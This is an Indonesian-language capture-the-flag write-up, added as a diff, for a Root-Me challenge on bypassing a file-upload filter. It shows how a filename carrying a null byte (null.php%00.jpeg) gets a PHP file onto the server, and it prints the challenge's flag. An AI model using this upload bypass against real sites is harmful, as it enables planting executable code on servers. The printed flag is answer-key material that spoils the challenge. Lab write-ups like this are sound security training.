@@ -1,0 +1,54 @@
+Soal : http://challenge01.root-me.org/web-serveur/ch22/
+
+	Challenge's Name : File upload - null byte
+	
+	Request : Your goal is to hack this photo galery by uploading PHP code.
+	
+Solusi : 
+	
+	Pada soal diminta untuk mengupload sebuah php code
+	
+	Akses url http://challenge01.root-me.org/web-serveur/ch22/?action=upload
+	
+	Terdapat form upload yang hanya diperbolehkan mengupload extensi GIF, JPEG or PNG
+	
+	mari kita coba membuat sebuah file php dengan script sebagai berikut
+	
+	<?php
+		echo 'OKE!!!'
+	?>
+	
+	save dengan nama file null.php.jpeg langsung saja upload pada form tersebut dan hasilnya
+	
+	File information :
+
+    Upload: null.php.jpeg
+    Type: image/jpeg
+    Size: 0.025390625 kB
+    Stored in: ./galerie/upload/3gq39tn3ogd9fd6ugcfn64jga5/null.php
+
+	Wrong file name !
+	
+	Ternyata masih gagal, lihat pada soal File upload - null byte 
+	mari kita rename file null.php.jpeg dengan menambahkan null byte (%00) atau karakter kosong menjadi null.php%00.jpeg
+	
+	upload kembali pada url http://challenge01.root-me.org/web-serveur/ch22/?action=upload
+	
+	dan hasilnya adalah
+	
+	File information :
+
+    Upload: null.php%00.jpeg
+    Type: image/jpeg
+    Size: 0.025390625 kB
+    Stored in: ./galerie/upload/3gq39tn3ogd9fd6ugcfn64jga5/null.php
+
+	File uploaded.
+	
+	dan buka link 
+	/galerie/upload/3gq39tn3ogd9fd6ugcfn64jga5/null.php dan kita akan mendapatkan sebuah flag 
+	
+	Well done ! You can validate this challenge with the password : YPNchi2NmTwygr2dgCCF
+	This file is already deleted.
+	
+	Flag : YPNchi2NmTwygr2dgCCF
